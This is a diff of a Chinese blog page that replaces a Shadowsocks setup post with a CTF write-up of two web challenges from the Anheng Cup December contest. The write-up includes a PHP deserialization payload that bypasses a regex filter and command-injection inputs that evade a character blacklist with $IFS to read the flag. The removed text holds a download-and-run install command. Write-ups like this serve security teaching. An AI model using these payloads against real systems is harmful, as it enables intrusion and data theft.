@@ -22,7 +22,7 @@
     <meta name="description" content="一步一个脚印">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>ss+vultr · Supersnail&#39;s advance</title>
+    <title>安恒杯12月月赛 · Supersnail&#39;s advance</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/" >SuperSnail&#39;s Advance</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">ss+vultr</a>
+                <a href="#" class="post-name">安恒杯12月月赛</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            ss+vultr
+            安恒杯12月月赛
             <!-- 404 -->
             
         </h1>
@@ -264,14 +264,20 @@ height:50vh;
             <div class="post-intros">
                 <!-- 文章页标签  -->
                 
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
+    
+</div>
+                
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">79</span>Reading time: <span class="post-count reading-time">1 min</span></span>
+                        <span>Word count: <span class="post-count word-count">347</span>Reading time: <span class="post-count reading-time">2 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/08/21</span>
+                    <span class="post-intro-time">2018/12/22</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -395,22 +401,29 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p>1.下载Putty<br>2.填写Host Name<br>3.输入root<br>4.输入服务器密码<br>5.执行命令</p>
-<pre><code>wget –no-check-certificate -O shadowsocks.sh https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.sh
-
-chmod +x shadowsocks.sh
-
-./shadowsocks.sh 2&gt;&amp;1 | tee shadowsocks.log
-</code></pre><p>6.设置SS密码和端口号，选择加密方式7<br>7.按任意键等待部署</p>
+        <h1 id="easy"><a href="#easy" class="headerlink" title="easy"></a>easy</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) </span><br><span class="line">        &#123;</span><br><span class="line">            $filename = <span class="string">"./&#123;$this-&gt;file&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($filename))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($filename); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;     </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span><br><span class="line">&#123; </span><br><span class="line">    $data = $_GET[<span class="string">'data'</span>];</span><br><span class="line">    preg_match(<span class="string">'/[oc]:\d+:/i'</span>,$data,$matches);</span><br><span class="line">    <span class="keyword">if</span>(count($matches))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Hacker!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $good = unserialize($data);</span><br><span class="line">        <span class="keyword">echo</span> $good;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="string">"./index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>题目源码。</p>
+<p>主要利用点反序列化漏洞。 当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。</p>
+<p><code>preg_match(&#39;/[oc]:\d+:/i&#39;,$data,$matches)</code>，需要先绕过这个匹配。参考博文<a href="https://blog.spoock.com/2016/11/03/php-wakeup/" target="_blank" rel="noopener">https://blog.spoock.com/2016/11/03/php-wakeup/</a>将</p>
+<p>故绕过payload<code>O:4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code><br>将<code>O:4修改为O:+4</code></p>
+<p>直接传值的话会，服务器接收到会把加号认为空格。</p>
+<p>将+进行URL编码<br>最终payload:<code>O:%2b4:&quot;baby&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p>
+<h1 id="easyweb2"><a href="#easyweb2" class="headerlink" title="easyweb2"></a>easyweb2</h1><p>在请求包中发现</p>
+<p>user=dXNlcg解码发现是user，将admin用base64编码然后修改Cookie.</p>
+<p>跳转到<img src="https://i.imgur.com/obFUyGt.png" alt=""></p>
+<p>执行cmd命令</p>
+<p>cmd=ls存在回显。尝试读文件在config.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf_exec</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">	$black_str = <span class="string">"/(;|&amp;|&gt;|&#125;|&#123;|%|#|!|\?|@|\+| )/i"</span>;</span><br><span class="line">		$str = preg_replace($black_str, <span class="string">""</span>,$str);</span><br><span class="line">		<span class="keyword">return</span> $str;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
+<p>看到了检测机制。过滤了空格但是$/未过滤。<br>然后通过$IFS(bash中的内部域分隔符)进行bypass</p>
+<p><img src="https://i.imgur.com/0KANGV4.png" alt=""><br>cmd=ls$IFS/  发现ffLAG_404<br>读取  <code>cmd=cat$IFS/ffLAG_404</code>读取flag;<br><img src="https://i.imgur.com/X7CZD1e.png" alt=""></p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>Author：<a href="http://yoursite.com">Jason_xi</a>
-            <p>原文链接：<a href="http://yoursite.com/2018/08/21/搭建SS/">http://yoursite.com/2018/08/21/搭建SS/</a>
-            <p>发表日期：<a href="http://yoursite.com/2018/08/21/搭建SS/">August 21st 2018, 12:23:51 pm</a>
-            <p>更新日期：<a href="http://yoursite.com/2018/08/21/搭建SS/">August 21st 2018, 12:23:51 pm</a>
+            <p>原文链接：<a href="http://yoursite.com/2018/12/22/安恒月赛Writeup/">http://yoursite.com/2018/12/22/安恒月赛Writeup/</a>
+            <p>发表日期：<a href="http://yoursite.com/2018/12/22/安恒月赛Writeup/">December 22nd 2018, 12:00:00 am</a>
+            <p>更新日期：<a href="http://yoursite.com/2018/12/22/安恒月赛Writeup/">December 23rd 2018, 12:11:26 pm</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -419,16 +432,16 @@ chmod +x shadowsocks.sh
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/09/12/VPS/" title= "vultr多端口开放">
-                    <div class="nextTitle">vultr多端口开放</div>
+                <a href= "/2018/12/22/Swpuctf_writeup/" title= "Swpuctf复现">
+                    <div class="nextTitle">Swpuctf复现</div>
                 </a>
             
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/08/06/编码问题/" title= "编码问题">
-                    <div class="prevTitle">编码问题</div>
+                <a href= "/2018/11/23/算法复习/" title= "算法复习">
+                    <div class="prevTitle">算法复习</div>
                 </a>
             
         </li>
@@ -555,7 +568,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#easy"><span class="toc-number">1.</span> <span class="toc-text">easy</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easyweb2"><span class="toc-number">2.</span> <span class="toc-text">easyweb2</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
